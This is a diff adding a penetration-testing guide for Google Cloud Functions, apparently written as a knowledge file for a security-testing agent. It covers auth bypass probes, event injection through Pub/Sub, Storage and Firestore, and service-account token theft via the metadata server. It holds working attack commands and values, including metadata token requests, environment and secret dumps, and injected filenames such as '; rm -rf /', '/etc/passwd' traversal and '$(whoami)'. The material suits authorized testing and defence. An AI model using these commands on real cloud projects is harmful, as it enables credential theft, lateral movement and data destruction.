@@ -1,0 +1,365 @@
+<gcp_cloud_functions_security_guide>
+<title>GCP CLOUD FUNCTIONS SECURITY TESTING</title>
+
+<critical>Google Cloud Functions is a serverless compute platform. Security vulnerabilities include function URL exposure, IAM misconfiguration, event injection, and service account abuse. Understanding Cloud Functions' authentication modes and event sources is essential for comprehensive testing.</critical>
+
+<scope>
+- Function authentication bypass
+- HTTP trigger vulnerabilities
+- Event source injection (Pub/Sub, Storage, Firestore)
+- Service account exploitation
+- Environment variable exposure
+- VPC and egress issues
+- Secret Manager integration security
+- 2nd Gen vs 1st Gen differences
+</scope>
+
+<methodology>
+1. Identify Cloud Functions and their trigger types.
+2. Test function URL authentication.
+3. Probe event sources for injection.
+4. Analyze service account permissions.
+5. Check for secret and configuration exposure.
+</methodology>
+
+<identification>
+<function_discovery>
+{% raw %}
+# Cloud Functions discovery:
+
+# gcloud enumeration:
+gcloud functions list
+gcloud functions describe FUNCTION_NAME
+
+# HTTP function URLs:
+# 1st Gen:
+https://REGION-PROJECT_ID.cloudfunctions.net/FUNCTION_NAME
+
+# 2nd Gen:
+https://FUNCTION_NAME-HASH-REGION.a.run.app
+
+# Common regions:
+us-central1, us-east1, europe-west1, asia-east1
+
+# Indicators in response:
+# X-Cloud-Trace-Context header
+# Function-specific error messages
+{% endraw %}
+</function_discovery>
+
+<trigger_types>
+{% raw %}
+# Cloud Functions trigger types:
+
+# HTTP triggers:
+# Direct URL invocation
+# Authenticated or public
+
+# Event triggers:
+# Cloud Storage (object events)
+# Pub/Sub (message events)
+# Firestore (document events)
+# Firebase (Auth, Analytics, etc.)
+# Cloud Scheduler (cron)
+# Eventarc (2nd Gen)
+{% endraw %}
+</trigger_types>
+</identification>
+
+<authentication_bypass>
+<http_auth>
+{% raw %}
+# HTTP function authentication:
+
+# 1. Public function (allow unauthenticated):
+# No authentication required
+curl https://REGION-PROJECT.cloudfunctions.net/function
+
+# 2. Authenticated function:
+# Requires IAM or OIDC token
+curl -H "Authorization: Bearer TOKEN" \
+    https://REGION-PROJECT.cloudfunctions.net/function
+
+# 3. Test for misconfigured public access:
+# Check if --allow-unauthenticated set incorrectly
+# allUsers or allAuthenticatedUsers in IAM
+
+# 4. Token types:
+# ID Token (preferred for Cloud Functions)
+# Access Token (for API calls)
+{% endraw %}
+</http_auth>
+
+<auth_bypass_attempts>
+{% raw %}
+# Authentication bypass techniques:
+
+# 1. No auth header:
+curl https://function-url/
+
+# 2. Invalid token:
+curl -H "Authorization: Bearer invalid" https://function-url/
+
+# 3. Expired token:
+curl -H "Authorization: Bearer expired_token" https://function-url/
+
+# 4. Wrong token type:
+# Access token instead of ID token
+
+# 5. Token for different function:
+# Cross-function token reuse
+
+# 6. Service account token:
+# If can obtain SA token
+gcloud auth print-identity-token --impersonate-service-account=SA_EMAIL
+{% endraw %}
+</auth_bypass_attempts>
+</authentication_bypass>
+
+<event_injection>
+<pubsub_injection>
+{% raw %}
+# Pub/Sub triggered function injection:
+
+# If attacker can publish to topic:
+gcloud pubsub topics publish TOPIC_NAME \
+    --message '{"malicious": "payload"}'
+
+# Python code example:
+publisher.publish(topic_path, data=malicious_payload.encode())
+
+# Attack vectors:
+# 1. JSON injection in message data
+# 2. Attribute injection
+# 3. Message ordering abuse
+# 4. Large message DoS
+{% endraw %}
+</pubsub_injection>
+
+<storage_injection>
+{% raw %}
+# Cloud Storage triggered function injection:
+
+# If attacker can write to bucket:
+gsutil cp malicious-file.json gs://BUCKET_NAME/
+
+# Attack vectors:
+# 1. Filename injection:
+gsutil cp file "gs://bucket/../../etc/passwd"
+gsutil cp file "gs://bucket/file; rm -rf /"
+
+# 2. Content injection:
+# Malicious file content processed by function
+
+# 3. Metadata injection:
+gsutil setmeta -h "x-goog-meta-custom:malicious" gs://bucket/file
+
+# 4. Object versioning abuse
+{% endraw %}
+</storage_injection>
+
+<firestore_injection>
+{% raw %}
+# Firestore triggered function injection:
+
+# If attacker can write to collection:
+db.collection('users').add({
+    'name': 'attacker',
+    '__proto__': {'isAdmin': true}
+});
+
+# Attack vectors:
+# 1. Field injection
+# 2. Prototype pollution via document
+# 3. Large document DoS
+# 4. Recursive trigger abuse
+{% endraw %}
+</firestore_injection>
+</event_injection>
+
+<service_account>
+<sa_enumeration>
+{% raw %}
+# Service account discovery:
+
+# Default service account:
+PROJECT_ID@appspot.gserviceaccount.com
+
+# Runtime service account:
+gcloud functions describe FUNCTION_NAME --format='value(serviceAccountEmail)'
+
+# If code execution in function:
+curl -H "Metadata-Flavor: Google" \
+    http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/email
+
+# List accessible projects:
+curl -H "Metadata-Flavor: Google" \
+    http://metadata.google.internal/computeMetadata/v1/project/project-id
+{% endraw %}
+</sa_enumeration>
+
+<sa_exploitation>
+{% raw %}
+# Service account exploitation:
+
+# 1. Get access token:
+curl -H "Metadata-Flavor: Google" \
+    "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token"
+
+# 2. Use token for API calls:
+curl -H "Authorization: Bearer ACCESS_TOKEN" \
+    https://cloudresourcemanager.googleapis.com/v1/projects
+
+# 3. Check permissions:
+# Use token to enumerate accessible resources
+# Test for overprivileged SA
+
+# 4. Service account impersonation:
+# If SA has iam.serviceAccountTokenCreator role
+{% endraw %}
+</sa_exploitation>
+</service_account>
+
+<environment_exposure>
+<env_vars>
+{% raw %}
+# Environment variable exposure:
+
+# If code execution in function:
+import os
+print(os.environ)
+
+# Common sensitive variables:
+DATABASE_URL
+API_KEY
+SECRET_KEY
+GOOGLE_APPLICATION_CREDENTIALS
+
+# Secret Manager integration:
+# Secrets may be in SECRET_* variables
+# Or accessed via Secret Manager API
+{% endraw %}
+</env_vars>
+
+<secret_manager>
+{% raw %}
+# Secret Manager access:
+
+# If function SA has access:
+from google.cloud import secretmanager
+
+client = secretmanager.SecretManagerServiceClient()
+response = client.access_secret_version(name="projects/PROJECT/secrets/SECRET/versions/latest")
+secret = response.payload.data.decode('UTF-8')
+
+# Or via metadata + API:
+curl -H "Authorization: Bearer TOKEN" \
+    "https://secretmanager.googleapis.com/v1/projects/PROJECT/secrets/SECRET/versions/latest:access"
+{% endraw %}
+</secret_manager>
+</environment_exposure>
+
+<2nd_gen_specific>
+<cloud_run_based>
+{% raw %}
+# 2nd Gen (Cloud Run) specific issues:
+
+# 1. Concurrency settings:
+# High concurrency may cause race conditions
+
+# 2. Minimum instances:
+# Always-on instances may have different attack surface
+
+# 3. Ingress settings:
+# internal-only vs all traffic
+
+# 4. VPC connector:
+# Access to private resources
+
+# 5. Container escape potential:
+# More capabilities than 1st Gen
+{% endraw %}
+</cloud_run_based>
+</2nd_gen_specific>
+
+<vpc_issues>
+<network_exploitation>
+{% raw %}
+# VPC and network issues:
+
+# 1. VPC connector access:
+# Function may reach private resources
+# Test for SSRF to internal IPs
+
+# 2. Egress restrictions:
+# Check if egress to internet allowed
+# Data exfiltration potential
+
+# 3. Shared VPC:
+# Cross-project resource access
+
+# 4. Private Google Access:
+# Access to Google APIs from private function
+{% endraw %}
+</network_exploitation>
+</vpc_issues>
+
+<common_payloads>
+{% raw %}
+# Authentication bypass:
+curl https://function-url/  # No auth
+curl -H "Authorization: Bearer invalid"  # Invalid token
+
+# Event injection (Pub/Sub):
+{"data": "$(whoami)", "attributes": {"malicious": "true"}}
+
+# Storage filename injection:
+gs://bucket/../../etc/passwd
+gs://bucket/file;id
+
+# Metadata access:
+curl -H "Metadata-Flavor: Google" \
+    http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
+{% endraw %}
+</common_payloads>
+
+<validation>
+1. Demonstrate unauthenticated access to functions.
+2. Show event injection triggering malicious behavior.
+3. Prove service account credential theft via metadata.
+4. Document environment variable or secret exposure.
+5. Provide evidence of VPC access to internal resources.
+</validation>
+
+<false_positives>
+- Function requires authentication properly
+- Event sources protected with appropriate IAM
+- Service account follows least privilege
+- Secrets in Secret Manager not in environment
+- VPC connector with proper network controls
+</false_positives>
+
+<impact>
+- Unauthorized function execution
+- Data theft via event injection
+- Service account credential theft
+- Lateral movement via SA permissions
+- Access to private network resources
+- Secret exposure
+</impact>
+
+<pro_tips>
+1. Check IAM bindings for allUsers or allAuthenticatedUsers.
+2. Event-triggered functions often trust event data implicitly.
+3. Metadata service provides service account tokens.
+4. Default service accounts are often overprivileged.
+5. 2nd Gen functions run on Cloud Run with different properties.
+6. VPC connectors can reach internal resources.
+7. Function environment may contain secrets.
+8. Pub/Sub topics may allow unauthorized publishing.
+9. Storage bucket permissions affect trigger security.
+10. Test both HTTP and event triggers independently.
+</pro_tips>
+
+<remember>Cloud Functions security depends on proper IAM configuration and event source protection. Functions often trust their event sources implicitly, making event injection a common attack vector. Always test for unauthenticated access and service account privilege abuse.</remember>
+</gcp_cloud_functions_security_guide>
